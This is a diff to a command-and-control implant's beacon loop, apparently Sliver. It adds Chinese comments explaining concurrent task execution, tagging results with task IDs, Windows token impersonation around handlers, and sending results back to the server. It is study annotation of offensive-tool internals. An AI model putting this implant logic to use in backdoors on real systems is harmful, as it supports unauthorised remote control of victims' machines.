@@ -322,6 +322,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	for {
 		duration := beacon.Duration()
 		nextCheckin = time.Now().Add(duration)
+		// 主要用来任务接收与执行
 		go func() {
 			oldInterval := beacon.Interval()
 			err := beaconMain(beacon, nextCheckin)
@@ -416,6 +417,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		return nil
 	}
 
+	// 多任务同时执行，然后添加到当前结构体中
 	results := []*sliverpb.Envelope{}
 	resultsMutex := &sync.Mutex{}
 	wg := &sync.WaitGroup{}
@@ -432,7 +434,10 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		if handler, ok := sysHandlers[task.Type]; ok {
 			wg.Add(1)
 			data := task.Data
+			// 用于结果回传时的标识
 			taskID := task.ID
+			// 下面为功能执行，Windows和非Windows实际的执行流程一致
+			// 唯一的区别是，Windows进行了一层包装，在执行前后加入了对Token的模拟和恢复
 			// {{if eq .Config.GOOS "windows" }}
 			go handlers.WrapperHandler(handler, data, func(data []byte, err error) {
 				resultsMutex.Lock()
@@ -444,6 +449,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 				}
 				log.Printf("[beacon] task completed (id: %d)", taskID)
 				// {{end}}
+				// 任务结果回传
 				results = append(results, &sliverpb.Envelope{
 					ID:   taskID,
 					Data: data,
